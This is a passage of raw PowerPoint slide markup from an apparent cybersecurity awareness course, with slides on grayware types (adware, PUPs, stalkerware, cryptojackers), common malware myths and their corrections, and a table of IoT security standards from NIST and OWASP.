                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451575">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Adware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Software that displays unsolicited advertisements, often browser-injected, to generate revenue for the developer</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Browser homepage hijacking, ad injection into web pages, tracking browsing history without consent</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Superfish (Lenovo, 2014), Fireball (China, 2017)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451575">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PUP</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Software bundled with legitimate installers that performs undisclosed actions</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Installing browser toolbars, changing default search engine, installing system "optimizer" tools</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ASK Toolbar, PC Optimizer Pro</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451575">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Stalkerware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mobile spyware marketed for "parental monitoring" or "employee tracking" but used for intimate partner surveillance</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>GPS tracking, SMS monitoring, call recording, hidden from device owner</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>mSpy, FlexiSPY, Hoverwatch</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451579">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Cryptojacker</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Malware that hijacks CPU/GPU resources for cryptocurrency mining without the owner's knowledge</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CPU pegged at 100%, device overheating, degraded performance</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Coinhive (browser-based), XMRig (system-level)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>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Adware, PUPs &amp; Grayware, The Gray Zone (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_grayware_spectrum.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3654791"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="502479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grayware spectrum, the dividing line between unwanted software and malware is consent and disclosure; grayware occupies a legally and ethically contested middle ground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Malware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 education is undermined by pervasive myths about malware. Addressing these misconceptions directly is essential for building accurate mental models that lead to effective defensive decision-making.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="254316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Myth vs. Reality</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="20931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Myth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "I'll know if my computer is infected, it will run slowly." </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Modern sophisticated malware (APT implants, spyware) is explicitly designed to have minimal performance impact and remain completely invisible to the user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "Antivirus software makes me safe from malware." </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Antivirus catches known malware via signatures. Polymorphic, metamorphic, and fileless malware routinely evades AV. AV is necessary but not sufficient.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "Macs don't get malware." </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> macOS malware exists and is growing. Silver Sparrow (2021) infected 30,000 Macs. XCSSET targets Xcode developers. macOS has a smaller market share, not zero vulnerabilities.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="254316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More Myths</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="20931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Myth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "If I don't open suspicious emails, I'm safe." </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Zero-click exploits (Pegasus), drive-by downloads, watering hole attacks, and supply chain compromises require no user interaction.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "Paying ransomware ensures I get my files back." </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> FBI data shows approximately 50% of victims who pay receive incomplete or non-functional decryptors. Payment funds future attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Myth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> "Small organizations aren't targets, attackers go after big companies." </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 61% of SMBs experienced a cyberattack in 2023 (Verizon DBIR). Automated malware like worms and ransomware do not discriminate by organization size.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Malware (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_malware_myths_vs_facts.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3945063"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="531506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Malware misconceptions vs. facts, accurate understanding of how malware operates is the prerequisite for making effective security decisions, at both the individual and organizational level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IoT Security Standards &amp; NIST Guidelines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IoT security landscape is governed by an evolving set of standards, guidelines, and regulations designed to establish minimum security baselines for connected devices, from NIST's IoT cybersecurity criteria to the EU's Cyber Resilience Act mandating security-by-design for connected products.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="2093369"/>
          <a:ext cx="10555354" cy="2706203"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="451033">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Standard / Framework</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Issuing Body</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Key Requirements</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Applicability</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451033">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST SP 800-213</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>IoT device cybersecurity requirements for federal use, device identification, configuration, data protection, logical access</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>US Federal procurement of IoT devices</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451033">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST IR 8259A</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Core baseline of IoT cybersecurity activities: software update, data protection, access control, event logging</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>IoT manufacturers, voluntary baseline</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451033">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OWASP IoT Top 10</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OWASP</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ten most critical IoT security risks: hardcoded passwords, insecure network services, insecure update mechanism</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>IoT developers and security assessors</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451033">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
